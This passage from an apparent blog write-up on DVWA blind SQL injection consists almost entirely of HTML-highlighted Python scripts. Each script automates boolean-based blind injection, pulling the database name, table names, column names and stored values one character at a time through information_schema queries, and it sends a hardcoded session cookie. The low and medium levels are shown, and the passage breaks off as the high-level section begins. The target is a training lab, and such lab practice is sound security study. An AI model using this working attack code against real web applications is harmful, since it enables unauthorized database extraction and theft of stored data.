class="string">'\n==&gt;'</span>,self.word_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word_num'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_length</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">            self.process(<span class="string">'get_&#123;0&#125;_length'</span>.format(column_name),i,<span class="number">200</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)%23"</span>.format(column_name,table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.word_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word length'</span>) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_name</span><span class="params">(self,table_name,column_name,word_num)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.word_length[word_num]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'get_&#123;0&#125;_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)%23"</span>.format(column_name,str(i),table_name,str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">                html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        self.word_name.append(name)</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_name[word_num])</span><br></pre></td></tr></table></figure><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Injection</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.zifuji = [<span class="number">44</span>,<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">45</span>, <span class="number">64</span>, <span class="number">33</span>, <span class="number">38</span>, <span class="number">36</span>]</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">'security=medium; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(self,yourstr,num1,num2)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]"</span>.format(yourstr,str(num1),str(num2)),end=<span class="string">'\r'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"User ID exists in the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"User ID is MISSING from the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tranhex</span><span class="params">(self,str1)</span>:</span></span><br><span class="line">        result = <span class="string">'0x'</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            result += hex(ord(i))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_itsnum()</span><br><span class="line">        self.get_database_length()</span><br><span class="line">        self.get_database()</span><br><span class="line">        self.get_table_num()</span><br><span class="line">        self.table_length = []</span><br><span class="line">        self.table_name = []</span><br><span class="line">        self.get_table_length()</span><br><span class="line">        self.get_table_name()</span><br><span class="line">        table_name = input(<span class="string">'[-] table_name: '</span>)</span><br><span class="line">        self.get_column_num(table_name)</span><br><span class="line">        self.column_length = []</span><br><span class="line">        self.column_name = []</span><br><span class="line">        self.get_column_length(table_name)</span><br><span class="line">        self.get_column_name(table_name)</span><br><span class="line">        column_names = input(<span class="string">'[-] column_name: '</span>).split(<span class="string">','</span>)</span><br><span class="line">        self.word_num = <span class="number">0</span></span><br><span class="line">        self.get_word_num(table_name,column_names[<span class="number">0</span>])</span><br><span class="line">        self.word_name = []</span><br><span class="line">        self.word_length = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(column_names)):</span><br><span class="line">            print(column_names[i])</span><br><span class="line">            self.get_word_length(table_name,column_names[i])</span><br><span class="line">            self.get_word_name(table_name,column_names[i],i)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_itsnum</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.itsnum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_itsnum'</span>,i,<span class="number">50</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 order by &#123;0&#125;"</span>.format(str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check(html):</span><br><span class="line">                self.itsnum = i - <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.itsnum &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.itsnum)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the itsnum"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_database_length'</span>,i,<span class="number">30</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and length(database())=&#123;0&#125;"</span>.format(str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.database_length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.database_length &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the database_length"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.database_length+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(str(i) + <span class="string">' get_database'</span>,j,self.database_length+<span class="number">1</span>)</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'id'</span>:<span class="string">"1 and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;"</span>.format(str(i),str(j)),</span><br><span class="line">                    <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    self.database += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(self.database) != i:</span><br><span class="line">                self.database += <span class="string">'666'</span></span><br><span class="line">        <span class="keyword">if</span> len(self.database) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\n can not get the database"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.table_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)"</span>.format(str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the table_num"</span>)           </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_length'</span>,i,<span class="number">50</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)"</span>.format(str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_length[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.table_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_table_name'</span>.format(i),j,<span class="number">50</span>)</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'id'</span>:<span class="string">"1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)"</span>.format(str(i),str(j)),</span><br><span class="line">                    <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,name)</span><br><span class="line">            self.table_name.append(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_num</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        self.column_num = <span class="number">0</span></span><br><span class="line">        table_name = self.tranhex(table_name)</span><br><span class="line">        print(table_name)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name=&#123;0&#125; having a=&#123;1&#125;)"</span>.format(table_name,str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.column_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        table_name = self.tranhex(table_name)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_length'</span>,i,<span class="number">100</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name=&#123;0&#125; having a=&#123;1&#125;)"</span>.format(table_name,str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.column_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        table_name = self.tranhex(table_name)</span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.column_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_column_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'id'</span>:<span class="string">"1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#123;1&#125; having a=&#123;2&#125;)"</span>.format(str(i),table_name,str(j)),</span><br><span class="line">                    <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) == self.column_length[<span class="number">0</span>]:</span><br><span class="line">            self.column_name.append(name)</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_name[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_num</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_word_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)"</span>.format(column_name,table_name,str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.word_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word_num'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_length</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">            self.process(<span class="string">'get_&#123;0&#125;_length'</span>.format(column_name),i,<span class="number">200</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)"</span>.format(column_name,table_name,str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.word_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word length'</span>) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_name</span><span class="params">(self,table_name,column_name,word_num)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.word_length[word_num]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'get_&#123;0&#125;_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'id'</span>:<span class="string">"1 and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)"</span>.format(column_name,str(i),table_name,str(j)),</span><br><span class="line">                    <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        self.word_name.append(name)</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_name[word_num])</span><br></pre></td></tr></table></figure><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 